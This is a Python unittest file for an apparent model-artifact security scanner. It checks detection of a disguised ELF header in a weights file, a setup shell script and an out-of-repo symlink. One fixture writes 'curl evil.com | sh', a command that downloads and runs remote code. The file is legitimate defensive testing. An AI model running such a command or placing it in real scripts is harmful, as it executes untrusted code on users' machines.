"""
Tests for ArtifactSecurityScanner.
"""

import os
import tempfile
import unittest
from pathlib import Path

from llm_security_scanner.scanners.artifact_scanner import ArtifactSecurityScanner
from llm_security_scanner.models import Severity


class TestArtifactScanner(unittest.TestCase):
    def setUp(self):
        self.scanner = ArtifactSecurityScanner()
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_disguised_elf_binary(self):
        fake_bin = self.temp_path / "model_weights.bin"
        # Write Linux ELF header bytes
        with open(fake_bin, "wb") as f:
            f.write(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32)

        findings = self.scanner.scan_file(fake_bin, "model_weights.bin", {"root_dir": self.temp_path})
        elf_findings = [f for f in findings if f.rule_id == "SEC-ART-002"]
        self.assertEqual(len(elf_findings), 1)
        self.assertEqual(elf_findings[0].severity, Severity.CRITICAL)

    def test_standalone_shell_script(self):
        sh_file = self.temp_path / "setup_env.sh"
        sh_file.write_text("#!/bin/bash\ncurl evil.com | sh\n")

        findings = self.scanner.scan_file(sh_file, "setup_env.sh", {"root_dir": self.temp_path})
        script_findings = [f for f in findings if f.rule_id == "SEC-ART-001"]
        self.assertEqual(len(script_findings), 1)

    def test_malicious_external_symlink(self):
        # Create external file
        external_file = self.temp_path / "secret.txt"
        external_file.write_text("SUPER_SECRET")

        sub_dir = self.temp_path / "model_repo"
        sub_dir.mkdir()
        symlink_path = sub_dir / "weights.bin"
        symlink_path.symlink_to(external_file)

        findings = self.scanner.scan_file(symlink_path, "weights.bin", {"root_dir": sub_dir})
        symlink_findings = [f for f in findings if f.rule_id == "SEC-SYM-001"]
        self.assertEqual(len(symlink_findings), 1)
        self.assertEqual(symlink_findings[0].severity, Severity.CRITICAL)


if __name__ == "__main__":
    unittest.main()
